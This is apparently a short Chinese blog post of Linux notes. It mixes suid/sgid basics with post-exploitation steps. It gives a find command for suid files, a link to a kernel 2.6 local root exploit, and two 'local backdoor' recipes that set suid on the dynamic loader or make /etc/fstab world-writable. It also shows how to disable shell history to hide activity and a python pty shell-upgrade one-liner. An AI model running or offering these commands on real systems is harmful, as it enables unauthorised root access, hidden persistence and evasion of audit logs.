---
layout: post
title: "Linux基础汇总"
---

## Linux基础汇总


* suid/guid

	suid意味着如果A用户对属于他自己的shell脚本文件设置了这种权限，那么其他用户在执行这个脚本的时候就拥有了A用户的权限。所以，如果 root用户对某一脚本设置了这一权限的话则其他用户执行该脚本的时候则拥有了root用户权限。同理，guid意味着执行相应脚本的用户则拥有了该文件所属用户组中用户的权限。

	给文件加suid和sgid的命令如下：

	    chmod u+s filename 设置suid位
	    chmod u-s filename 去掉suid设置
	    chmod g+s filename 设置sgid位
	    chmod g-s filename 去掉sgid设置

* find / -type f -perm /u+s -ls

	-perm #按执行权限来查找

	-type b/d/c/p/l/f #查是块设备、目录、字符设备、管道、符号链接、普通文件

* Linux kernel 2.6 < 2.6.19 (32bit) ip_append_data() local ring0 root exploit

	[http://www.lengmo.net/post/1380]

* 本地后门2法 xi4oyu

	1.
	
	    cd /lib
	    chmod +s ld-linux.so.2
	    /lib/ld-linux.so.2 `which whoami`

	2.
	
	    chmod a+w /etc/fstab
	    echo 'test /mnt ext2 user,suid,exec,loop 0 0' >> /etc/fstab
	    chown root.root setuid
	    chmod u+s setuid
	    mount test
	    cd /mnt

* ssh的history处理 & 日至相关

	    export HISTFILE=/dev/null

	ssh日志默认保存在 /var/log/secure文件里
	
* python -c 'import pty; pty.spawn("/bin/sh")'

* 基础操作

	增加一个用户
	useradd application
	passwd // 根据提示设置密码
	
* test


	


